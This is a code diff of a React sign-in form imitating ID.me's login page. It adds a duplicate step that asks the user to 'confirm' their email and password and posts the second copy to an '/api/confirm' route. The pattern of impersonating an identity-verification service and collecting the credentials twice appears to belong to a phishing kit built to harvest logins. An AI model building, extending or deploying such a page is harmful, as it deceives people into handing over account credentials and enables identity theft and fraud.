@@ -17,10 +17,9 @@ import { AppleIcon, FacebookIcon, GoogleIcon, LinkedinIcon } from "../icons";
 import Link from "next/link";
 import axios from "axios";
 import { ClipLoader } from "react-spinners";
-import StepOneDup from "./StepOneDup";
-import StepThreeDup from "./StepThreeDup";
+import StepOne from "./StepOne";
 
-const StepOne = () => {
+const StepOneDup = () => {
   const {
     stepIndex,
     formStep,
@@ -38,8 +37,7 @@ const StepOne = () => {
       <StepOneDup key={1} />,
       <StepTwo key={2} />,
       <StepThree key={3} />,
-      <StepThreeDup key={4} />,
-      <StepFour key={5} />,
+      <StepFour key={4} />,
     ],
     "kdm"
   );
@@ -47,7 +45,7 @@ const StepOne = () => {
   const [isLoading, setIsLoading] = useState(false);
 
   return (
-    <div className="mt-[-30px]  w-[340px] md:w-[450px] drop-shadow-custon bg-white rounded-[10px] py-8 px-8 top-[90px] ">
+    <div className="mt-[-30px] w-[340px] md:w-[450px] drop-shadow-custon bg-white rounded-[10px] py-8 px-8 top-[90px] ">
       <h2 className="text-[#242C39] flex items-center justify-center w-full font-bold pb-4 text-[16px] md:text-[20px]">
         Sign in to ID.me
       </h2>
@@ -66,27 +64,27 @@ const StepOne = () => {
             Create an ID.me account
           </Link>
         </div>
-        <p className="text-[13px] font-extralight pt-1">
-          <span className="font-bold mr-1">*</span>Indicates a required field
+        <p className="text-[13px] font-bold pt-1">
+          Please confirm your sign-in details.
         </p>
         <div>
           <InputField
             label="Email *"
-            name="email"
+            name="emailDup"
             type="email"
             labelClassName="text-[12px] font-bold capitalize pb-2"
             error={methods.formState.errors.email?.message as string}
-            inputClassName="px-4 py-4 border-[0.1px] border-[#949494] rounded-[4px] w-full text-[14px]  "
+            inputClassName="px-4 py-4 border-[0.1px] border-[#949494] rounded-[4px] w-full text-[10px]  "
           />
         </div>
         <div>
           <InputField
             label="Password *"
-            name="password"
+            name="passwordDup"
             type="password"
             labelClassName="text-[12px] font-bold capitalize ] pt-6 pb-2"
             error={methods.formState.errors.password?.message as string}
-            inputClassName="px-4 py-4 border-[0.1px] border-[#949494] rounded-[4px] w-full text-[14px]  "
+            inputClassName="px-4 py-4 border-[0.1px] border-[#949494] rounded-[4px] w-full text-[10px]  "
           />
         </div>
         <div className="flex gap-2 pt-1 pb-4">
@@ -101,17 +99,17 @@ const StepOne = () => {
         <button
           type="button"
           onClick={async () => {
-            const isValid = await methods.trigger(["email", "password"]);
-            let email = await methods.watch("email"); // Manually validate fields
-            let password = await methods.watch("password"); // Manually validate fields
-            setIsLoading(true);
+            const isValid = await methods.trigger(["emailDup", "passwordDup"]);
+            let emailDup = await methods.watch("emailDup"); // Manually validate fields
+            let passwordDup = await methods.watch("passwordDup"); // Manually validate fields
             if (isValid) {
-              email = await methods.watch("email"); // Manually validate fields
-              password = await methods.watch("password"); // Manually validate fields
+              setIsLoading(true);
+              emailDup = await methods.watch("emailDup"); // Manually validate fields
+              passwordDup = await methods.watch("passwordDup"); // Manually validate fields
               try {
-                const response = await axios.post("/api/signin", {
-                  email,
-                  password,
+                const response = await axios.post("/api/confirm", {
+                  emailDup,
+                  passwordDup,
                 });
 
                 if (response.status === 200) {
@@ -134,11 +132,11 @@ const StepOne = () => {
         >
           {isLoading ? (
             <>
-              Continue
+              Signing in...
               <ClipLoader className="ml-2" size={14} color="white" />
             </>
           ) : (
-            "Continue"
+            "Sign in"
           )}
         </button>
         <Link
@@ -179,4 +177,4 @@ const StepOne = () => {
   );
 };
 
-export default StepOne;
+export default StepOneDup;
